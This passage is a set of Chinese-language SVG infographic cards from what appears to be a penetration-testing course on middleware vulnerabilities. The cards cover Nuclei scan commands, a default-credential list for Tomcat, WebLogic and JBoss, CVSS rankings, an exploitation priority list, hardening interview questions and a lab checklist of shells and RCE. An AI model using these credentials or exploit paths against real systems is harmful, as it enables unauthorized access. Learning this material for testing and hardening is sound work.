  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0f172a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧰 Nuclei模板矩阵</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">nuclei -t weblogic/</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">nuclei -t tomcat/</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">nuclei -t iis/</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">nuclei -t nginx/</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">nuclei -t apache/</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">nuclei -t jboss/</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g59urv5gw" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g59urv5gw)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c3aed" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🕸️ 默认口令Top10</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">tomcat/tomcat</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">admin/admin</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">weblogic/weblogic</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">root/123456</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">manager/manager</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">deployer/deployer</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gu5r82oaq" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gu5r82oaq)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📊 CVSS 分数排行榜</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Weblogic 14882 CVSS 9.8</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Tomcat AJP 1938 9.8</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JBoss默认 满分 10.0</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">IIS 6 解析漏洞 9.3</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Nginx alias 穿越 7.5</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="grdzg2vxi" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#grdzg2vxi)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#b45309" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎯 实战利用优先级</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">P0 Weblogic Console未授权</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">P1 JBoss未授权WAR部署</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">P2 IIS6解析+任意上传</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">P3 Tomcat PUT/后台弱口</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">P4 Nginx alias 目录穿越</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gs2on402s" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gs2on402s)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧠 面试高频问答</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">解析漏洞根本成因?</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PUT上传防护四件事?</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">T3协议怎么识别拦截?</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Weblogic 6 项加固?</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">WAR部署的三个步骤?</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">IIS短文件名怎么防护?</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="grwhv945b" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#grwhv945b)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">✅ 通关自测CheckList</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">IIS 6 asp;.jpg 成功拿Shell</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Weblogic 14882 一键RCE成功</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JBoss WAR部署上线成功</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Tomcat manager 弱口令成功</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Nginx alias穿越读到源码</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">加固后漏洞全部失效</text>
</svg>
